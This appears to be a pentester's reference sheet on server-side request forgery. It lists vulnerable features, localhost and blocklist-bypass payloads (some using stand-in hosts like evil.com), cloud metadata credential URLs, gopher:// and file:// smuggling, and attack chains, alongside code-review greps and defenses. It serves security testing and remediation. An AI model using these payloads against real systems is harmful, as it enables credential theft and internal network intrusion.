# Server-side request forgery — technique reference

## 1. Mental model

The server fetches a URL on behalf of the user. The user controls the URL
target (fully or partially). Result: server-originated requests to attacker-
chosen destinations — internal hosts, cloud metadata, file:// schemes,
gopher://, and (if response reflected) data exfil.

The trust chain to attack:

```
client -> APP (egress allowed to internal LAN, metadata, intranet) -> $TARGET
```

The defender's job is restricting what `$TARGET` can be. SSRF is the bug class
when that restriction fails.

## 2. Where to look (sinks)

Any feature that fetches a URL from user input:

- Webhook configuration (paste any URL → server `POST`s to it)
- Image / file URL imports (avatar upload by URL)
- PDF / HTML rendering (headless browser, wkhtmltopdf)
- URL preview / link unfurl (chat, social, bookmarking apps)
- OAuth / OIDC callback / discovery URLs (`.well-known/openid-configuration`)
- WSDL / XML-RPC import
- Server-side `fetch`/`axios`/`requests`/`curl` invoked with user input
- Proxy features ("download this file for me")
- Server-side rendering of Markdown with image inclusion
- XML external entity expansion (XXE often achieves SSRF)
- SVG processing on server (`<image href>`, foreignObject)
- Postscript / Ghostscript file upload
- OCR / antivirus that follows URLs in input
- LDAP search filter that follows referrals
- Database features: PostgreSQL `dblink`, `COPY FROM PROGRAM`, MySQL
  `LOAD DATA INFILE`, `LOAD_FILE`
- Headless `<iframe>`-based features
- Email rendering (CID / external image fetch)

## 3. First-look payloads

Replace target URL with:

```
http://127.0.0.1
http://127.0.0.1:22       # check for telnet-banner-style response
http://localhost
http://[::1]
http://0.0.0.0
http://0
http://2130706433         # decimal 127.0.0.1
http://0177.0.0.1         # octal
http://0x7f.0.0.1         # hex
http://127.1
http://127.0.0.1.nip.io   # DNS rebind helper
```

Compare response: status, length, timing. Anything different = the request
was made; SSRF is real (even if response not reflected).

## 4. Cloud-metadata pivot

If the host runs in cloud, metadata services contain credentials:

| Provider | URL | Headers |
|----------|-----|---------|
| AWS IMDSv1 | `http://169.254.169.254/latest/meta-data/` | none |
| AWS IMDSv2 | same | `X-aws-ec2-metadata-token` (must PUT to token endpoint first) |
| AWS IAM creds | `http://169.254.169.254/latest/meta-data/iam/security-credentials/<role>` | |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `Metadata-Flavor: Google` |
| GCP token | `http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token` | `Metadata-Flavor: Google` |
| Azure IMDS | `http://169.254.169.254/metadata/instance?api-version=2021-02-01` | `Metadata: true` |
| Azure token | `http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://vault.azure.net/` | `Metadata: true` |
| DigitalOcean | `http://169.254.169.254/metadata/v1/` | none |
| Hetzner | `http://169.254.169.254/hetzner/v1/metadata` | none |
| Oracle Cloud | `http://169.254.169.254/opc/v2/` | `Authorization: Bearer Oracle` |
| Alibaba | `http://100.100.100.200/latest/meta-data/` | none |
| Kubernetes (in pod) | `http://kubernetes.default.svc/api/` + service-account token from `/var/run/secrets/...` | bearer token |

If IMDSv2 is enforced (good), simple GET-only SSRF against AWS metadata fails.
But: SSRF that allows custom headers (rare) or PUT (rarer) bypasses it.

## 5. Internal service discovery

After confirming SSRF reaches LAN:

- Sweep RFC1918 ranges: `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`
- Service ports to try: 22 (SSH banner), 80/443 (web), 3306 (MySQL), 5432
  (PostgreSQL), 6379 (Redis), 9200 (Elastic), 27017 (Mongo), 2375/2376 (Docker
  daemon), 8500 (Consul), 8080 (Tomcat / Jenkins), 5000 (Flask debug),
  9000 (PHP-FPM / SonarQube)
- Use timing oracle if response not reflected: closed port → fast TCP RST,
  open → slow protocol negotiation

## 6. Blind SSRF

Response not reflected. Channels:

- **DNS** — set up controlled domain, attempt `http://<rand>.attacker.tld`,
  watch DNS logs (Burp Collaborator, interactsh, your authoritative DNS).
- **HTTP callback** — same domain serving HTTP; record User-Agent, source IP.
- **Time-based** — slow vs fast targets reveal port state.

Always: in scope-sensitive engagements, get charter approval before egressing
to third-party services.

## 7. URL parser tricks (to bypass blocklists)

The server may parse URL with one library, then fetch with another. Mismatches:

```
http://evil.com#@127.0.0.1/        # fragment in user-info
http://evil.com@127.0.0.1/         # user-info contains a host
http://127.0.0.1.evil.com/         # treats .evil.com as host but DNS resolves to attacker
http://127.0.0.1%2eevil.com/       # encoded dot — Python urllib vs requests differ
http://127.1.1.1#.evil.com         # fragment trick
http://127.0.0.1:80@evil.com/      # port + user-info confusion
http://①②⑦.⓪.⓪.①                  # circled digits, normalised by some libs
http://127。0。0。1                  # CJK fullwidth dot — treated as . by some resolvers
http://[::ffff:127.0.0.1]          # IPv4-mapped IPv6
```

DNS rebinding: register a domain, set very low TTL, point it to a benign IP
for first resolution, then rotate to internal IP for subsequent fetches.
Useful when app validates URL once then re-resolves to fetch.

## 8. Protocol smuggling

If the URL fetcher accepts non-HTTP schemes:

| Scheme | Use |
|--------|-----|
| `file://` | local file read (`file:///etc/passwd`) |
| `gopher://` | construct arbitrary TCP payload — `gopher://127.0.0.1:6379/_SET%20...` for unauth Redis |
| `dict://` | dictionary protocol; works against Redis (`dict://redis/INFO`) |
| `ftp://` | FTP banner / list |
| `ldap://` | LDAP queries |
| `tftp://` | UDP-based; rarely useful |
| `jar://` | Java URL handler — chained with classpath confusion |
| `netdoc://` | Java |

Curl supports all of these by default. PHP `file_get_contents`, Python
`urllib`/`urllib2`, Java `URL`, Ruby `open-uri` all accept various schemes.

## 9. Real-world chains

- SSRF → AWS metadata → IAM role → S3 read access → bucket dump
- SSRF → internal Redis (no auth) → SET cron / SSH key → RCE
- SSRF → Jenkins script console (no auth on internal) → RCE
- SSRF → Consul / Etcd → cluster secret extraction
- SSRF → internal admin panel (cookieless auth based on source IP) → admin
- SSRF → internal password reset token endpoint → ATO

Document each as a chain finding.

## 10. Source-code review heuristics

```
grep -rEn "requests\.get\(|requests\.post\(|urllib\.request|urlopen\(" --include='*.py'
grep -rEn "fetch\(|axios\(|axios\.get\(|axios\.post\(|http\.get\(|got\(|node-fetch" --include='*.js' --include='*.ts'
grep -rEn "HttpClient|RestTemplate|WebClient|URL\(" --include='*.java'
grep -rEn "Net::HTTP|open\-uri|HTTParty|Faraday|RestClient" --include='*.rb'
grep -rEn "file_get_contents|curl_exec|fopen\(" --include='*.php'
grep -rEn "http\.Get\(|http\.NewRequest" --include='*.go'

# look for URL params reaching these
grep -rB3 -A3 "user_input\|params\[\|req\.body\|query\." | grep -E "fetch|request|http"
```

Also check XML / JSON deserialisers for `xinclude`, `entity`, network-fetching
features.

## 11. Defenses (for remediation)

1. **Allowlist** of permitted hosts / domains for outbound fetches; not
   blocklist.
2. **DNS resolution at validation time AND fetch time** — both must hit the
   allowlist (defeats DNS rebinding).
3. **Reject responses to private ranges** at the HTTP client layer.
4. **Disable redirect following** on user-input fetches, or re-validate each
   redirect target.
5. **IMDSv2 with hop-limit=1** on AWS — single hop kills SSRF-from-container.
6. **Network segmentation** — egress firewall blocking RFC1918 by default.
7. **Separate VPC / network for fetch workers** with no internal routes.
8. **No file://, gopher://, dict://, etc.** — only `https://` (and `http://`
   if business-justified).

## 12. CWE / standards mapping

- CWE-918 — SSRF
- CWE-611 — XXE (often a route to SSRF)
- OWASP WSTG WSTG-INPV-19
- OWASP API Top 10 2023 API7
- OWASP Top 10 2021 A10

## 13. Tools

- Burp Collaborator / interactsh / pingb.in / your DNS — OOB callback
- ssrfmap, gopherus — payload generation for protocol smuggling
- nuclei templates `http/vulnerabilities/generic/basic-ssrf.yaml`
- Smuggler.py for HTTP request smuggling that often combines with SSRF
